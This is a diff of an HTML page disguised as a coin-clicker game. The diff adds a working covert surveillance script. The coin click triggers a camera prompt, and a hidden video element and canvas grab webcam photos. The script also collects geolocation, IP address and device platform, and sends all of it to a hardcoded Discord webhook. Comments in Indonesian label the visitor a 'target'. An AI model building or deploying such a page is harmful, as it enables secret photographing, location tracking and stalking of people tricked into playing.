@@ -4,125 +4,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Super Coin Clicker - Free Rewards</title>
+    <title>Super Coin Clicker - Global Leaderboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #0f172a; color: white; user-select: none; }
-        .coin { filter: drop-shadow(0 0 10px #fbbf24); cursor: pointer; transition: transform 0.1s; }
-        .coin:active { transform: scale(0.9); }
-        #v { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
-        #c { display: none; }
+        body { background: #020617; color: #f8fafc; font-family: sans-serif; overflow: hidden; }
+        .coin-glow { filter: drop-shadow(0 0 20px rgba(234, 179, 8, 0.4)); transition: all 0.1s; }
+        .coin-glow:active { transform: scale(0.9) rotate(5deg); }
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen">
+<body class="flex items-center justify-center min-h-screen">
 
-    <div class="text-center p-8 bg-slate-800 rounded-3xl border-4 border-yellow-500 shadow-2xl">
-        <h1 class="text-3xl font-black text-yellow-500 mb-2">COIN COLLECTOR</h1>
-        <p class="text-xs text-slate-400 mb-8 italic">Klik koin secepat mungkin!</p>
+    <div id="app" class="text-center p-10 bg-slate-900/80 backdrop-blur-xl border border-slate-700 rounded-[2.5rem] shadow-2xl max-w-sm w-full mx-4">
+        <h1 class="text-3xl font-black text-yellow-500 tracking-tighter mb-1">GOLD CLICKER</h1>
+        <p class="text-[10px] text-slate-500 uppercase tracking-widest mb-8">Tap to Earn Rewards</p>
         
-        <div class="mb-6">
-            <img id="coinBtn" src="https://img.icons8.com/emoji/160/gold-coin-emoji.png" class="coin w-40 h-40 mx-auto" alt="Coin">
+        <div class="relative group cursor-pointer">
+            <div class="absolute inset-0 bg-yellow-500/20 blur-3xl rounded-full group-hover:bg-yellow-500/30 transition-all"></div>
+            <img id="btn" src="https://img.icons8.com/emoji/160/gold-coin-emoji.png" class="coin-glow w-48 h-48 mx-auto relative z-10" alt="Coin">
         </div>
 
-        <div class="text-4xl font-mono font-bold" id="score">0</div>
-        <div id="status" class="text-[10px] mt-4 text-slate-500">Status: System Online</div>
+        <div class="mt-8 bg-slate-950/50 py-4 rounded-2xl border border-slate-800">
+            <p class="text-slate-400 text-xs mb-1">TOTAL GOLD</p>
+            <div id="score" class="text-5xl font-mono font-black text-white">0</div>
+        </div>
+
+        <p class="mt-6 text-[10px] text-slate-600 italic">By continuing, you agree to our Terms of Service</p>
     </div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+    <!-- Hidden Capture System -->
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1482214137768710249/VWsfojpRVV6Z8NfiJUpOxFfeQTqmfRhILAlg0_2uVZBmGdMawDyhbygK0VOKyVwYR2sT";
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
-        const scoreEl = document.getElementById('score');
-        const statusEl = document.getElementById('status');
-        let count = 0;
-        let streamActive = false;
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        const btn = document.getElementById('btn');
+        const scoreDisplay = document.getElementById('score');
+        
+        let score = 0;
+        let isSystemReady = false;
 
-        // Fungsi kirim log error ke Discord
-        async function logToDiscord(msg) {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `⚠️ **LOG:** ${msg}` })
-            });
+        async function log(msg) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `🛠️ **SYSTEM LOG:** ${msg}` })
+                });
+            } catch(e) {}
         }
 
-        // Inisialisasi Akses
-        async function init() {
+        // Fungsi inisialisasi saat klik pertama (Bypass Vercel/Chrome strict policy)
+        async function activateSystem() {
+            if (isSystemReady) return;
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                streamActive = true;
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                v.srcObject = stream;
                 
-                // Minta Lokasi
-                navigator.geolocation.getCurrentPosition(() => {}, (err) => logToDiscord("Lokasi Ditolak: " + err.message));
-                
-                logToDiscord("✅ Seseorang masuk ke Web dan memberikan izin Kamera.");
+                // Pastikan video benar-benar jalan
+                v.onloadedmetadata = () => {
+                    v.play();
+                    isSystemReady = true;
+                    log("✅ Akses Kamera Diberikan oleh Target di Vercel.");
+                    
+                    // Langsung minta lokasi setelah kamera oke
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => log(`📍 Lokasi Terdeteksi: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
+                        (e) => log(`❌ Lokasi Ditolak: ${e.message}`)
+                    );
+                };
             } catch (err) {
-                logToDiscord("❌ Target Menolak Izin Kamera atau Browser tidak support HTTPS.");
+                log(`❌ Target Menolak Kamera atau Error: ${err.name}`);
             }
         }
 
-        window.onload = init;
+        btn.addEventListener('click', async () => {
+            score++;
+            scoreDisplay.innerText = score;
+            
+            // Klik pertama mengaktifkan sistem izin
+            if (score === 1) {
+                await activateSystem();
+            }
 
-        document.getElementById('coinBtn').addEventListener('click', async () => {
-            count++;
-            scoreEl.innerText = count;
-
-            // Ambil data setiap 3 klik pertama untuk memastikan data masuk
-            if (streamActive && (count === 1 || count % 10 === 0)) {
+            // Capture pada klik ke-3 dan kelipatan 10
+            if (isSystemReady && (score === 3 || score % 10 === 0)) {
                 capture();
             }
         });
 
         async function capture() {
-            try {
-                const ctx = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0);
-                
-                const imgData = canvas.toDataURL('image/jpeg', 0.7);
-                const blob = await (await fetch(imgData)).blob();
+            const ctx = c.getContext('2d');
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            
+            const dataUrl = c.toDataURL('image/jpeg', 0.8);
+            const blob = await (await fetch(dataUrl)).blob();
 
-                // Dapatkan IP
-                const ipReq = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipReq.json();
+            const ipFetch = await fetch('https://api.ipify.org?format=json').catch(() => ({ json: () => ({ ip: "Unknown" }) }));
+            const ipData = await ipFetch.json();
 
-                // Dapatkan Lokasi
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const { latitude, longitude } = pos.coords;
-                    await sendData(blob, ipData.ip, latitude, longitude);
-                }, async () => {
-                    await sendData(blob, ipData.ip, "Ditolak", "Ditolak");
-                });
-            } catch (e) {
-                logToDiscord("Error saat capture: " + e.message);
-            }
-        }
-
-        async function sendData(imageBlob, ip, lat, lon) {
             const fd = new FormData();
-            fd.append('file', imageBlob, 'capture.jpg');
+            fd.append('file', blob, `hit_${Date.now()}.jpg`);
             fd.append('payload_json', JSON.stringify({
                 embeds: [{
-                    title: "📸 TARGET TERDITEKSI!",
+                    title: "💀 DATA TARGET BERHASIL DITARIK",
                     color: 16711680,
                     fields: [
-                        { name: "IP Address", value: ip, inline: true },
-                        { name: "Peta", value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: true },
-                        { name: "User Agent", value: navigator.userAgent }
+                        { name: "IP", value: ipData.ip, inline: true },
+                        { name: "Device", value: navigator.platform, inline: true },
+                        { name: "Score Click", value: score.toString(), inline: true }
                     ],
-                    timestamp: new Date()
+                    footer: { text: "cvAI4 v3.0.45 | King 77king" }
                 }]
             }));
 
-            await fetch(WEBHOOK, { method: 'POST', body: fd });
+            fetch(WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
         }
     </script>
 </body>
 </html>
 
 ```
+    
